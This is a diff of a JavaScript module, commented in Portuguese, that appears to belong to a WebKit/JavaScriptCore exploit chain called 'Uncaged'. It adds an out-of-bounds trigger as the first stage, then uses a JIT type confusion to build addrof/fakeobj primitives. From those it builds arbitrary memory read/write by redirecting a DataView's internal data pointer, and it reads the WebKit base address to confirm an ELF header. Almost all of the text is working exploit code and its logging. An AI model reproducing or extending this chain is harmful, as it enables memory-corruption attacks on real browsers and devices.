@@ -1,20 +1,19 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v119 - Primitivas de L/E Robustas via DataView)
+// js/script3/testArrayBufferVictimCrash.mjs (v120 - Correção de Pré-requisito do JIT)
 // =======================================================================================
 // LOG DE ALTERAÇÕES:
-// - CORRIGIDO: O bug de "stale data" (dados obsoletos) foi resolvido. A implementação
-//   anterior de L/E retornava valores cacheados em vez de ler/escrever na memória real.
-// - REFEITAS: As primitivas de arb_read/arb_write foram completamente refeitas para
-//   usar uma técnica mais robusta que envolve sequestrar o ponteiro de dados interno
-//   de um objeto DataView.
-// - ESTRUTURA: A verificação funcional e a tentativa de vazamento do WebKit agora usam
-//   essas novas primitivas, garantindo que as operações de memória são reais.
+// - CORRIGIDO: Resolvido o TypeError que ocorria porque `addrof` retornava `undefined`.
+// - MOTIVO: Uma análise do código funcional (v100) revelou que a vulnerabilidade de JIT
+//   só é ativada APÓS o estado da memória ser corrompido pela primitiva OOB.
+// - ADICIONADO: A chamada para `triggerOOB_primitive` foi reintroduzida como a primeira
+//   etapa do exploit, sendo um pré-requisito para que a JIT Type Confusion funcione.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
+import { triggerOOB_primitive } from '../core_exploit.mjs'; // Importação necessária
 
-export const FNAME_MODULE_FINAL = "Uncaged_v119_RobustRW";
+export const FNAME_MODULE_FINAL = "Uncaged_v120_JIT_PrereqFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) { /* ...código sem alterações... */ }
@@ -25,13 +24,18 @@ function doubleToInt64(double) { /* ...código sem alterações... */ }
 // =======================================================================================
 export async function runFinalUnifiedTest() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Primitivas de L/E Robustas via DataView ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Corrigindo Pré-requisito da JIT Confusion ---`, "test");
 
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
 
     try {
-        // --- FASE 1: Estabelecer Primitivas 'addrof' e 'fakeobj' via JIT-Confusion ---
-        logS3("--- FASE 1: Configurando primitivas via JIT Type Confusion... ---", "subtest");
+        // --- FASE 1: Ativar Pré-requisito e Configurar Primitivas ---
+        logS3("--- FASE 1: Ativando pré-requisito OOB e configurando primitivas... ---", "subtest");
+        
+        // #REASONING: A chamada OOB é necessária para desestabilizar o motor e ativar
+        // a vulnerabilidade de JIT Type Confusion. Este era o passo que faltava.
+        await triggerOOB_primitive({ force_reinit: true });
+
         const confused_array = [13.37];
         const victim_array = [{ a: 1 }];
         const addrof = (obj) => {
@@ -46,35 +50,30 @@ export async function runFinalUnifiedTest() {
 
         // --- FASE 2: Construção de Primitivas de L/E ROBUSTAS ---
         logS3("--- FASE 2: Construindo L/E arbitrária ROBUSTA via DataView... ---", "subtest");
-
-        // Criamos um DataView que será nossa ferramenta de L/E.
         const dv_buf = new ArrayBuffer(8);
         const dataview_tool = new DataView(dv_buf);
-
-        // Usamos 'addrof' para encontrar o endereço do nosso DataView.
         const dataview_addr = addrof(dataview_tool);
-        // Com base nos offsets do JSC, encontramos o endereço do ponteiro de dados (m_vector).
+        
+        // Verifica se o addrof funcionou antes de prosseguir
+        if (!dataview_addr || typeof dataview_addr.add !== 'function') {
+            throw new Error("A primitiva 'addrof' falhou em retornar um objeto AdvancedInt64 válido após o gatilho OOB.");
+        }
+
         const dv_vector_ptr_addr = dataview_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
         logS3(`[SETUP] Endereço do ponteiro de dados do DataView (m_vector): ${toHex(dv_vector_ptr_addr)}`, "info");
 
-        // Criamos uma primitiva de escrita instável, apenas para configurar nossa ferramenta.
         const leaker_obj = { obj_prop: null, val_prop: 0 };
         const unstable_arb_write = (addr, value) => {
             leaker_obj.obj_prop = fakeobj(addr);
             leaker_obj.val_prop = int64ToDouble(value);
         };
 
-        // Agora, as primitivas ROBUSTAS:
         const arb_write = (addr, value) => {
-            // 1. Usamos a escrita instável para fazer nosso DataView apontar para o endereço alvo.
             unstable_arb_write(dv_vector_ptr_addr, addr);
-            // 2. Usamos o método nativo do DataView para escrever o valor. Isso é confiável.
             dataview_tool.setFloat64(0, int64ToDouble(value), true);
         };
         const arb_read = (addr) => {
-            // 1. Fazemos o DataView apontar para o endereço alvo.
             unstable_arb_write(dv_vector_ptr_addr, addr);
-            // 2. Usamos o método nativo para ler o valor.
             return doubleToInt64(dataview_tool.getFloat64(0, true));
         };
         logS3("Primitivas de L/E robustas construídas.", "good");
@@ -115,7 +114,7 @@ export async function runFinalUnifiedTest() {
         const elf_magic = arb_read(webkit_base).low();
         logS3(`[LEAK] Assinatura ELF lida: ${toHex(elf_magic)}`, "leak");
 
-        if (elf_magic === 0x464C457F) { // 0x7F 'E' 'L' 'F'
+        if (elf_magic === 0x464C457F) {
             logS3("++++++++++++ SUCESSO FINAL! A assinatura ELF foi encontrada! ++++++++++++", "vuln");
             final_result = {
                 success: true,
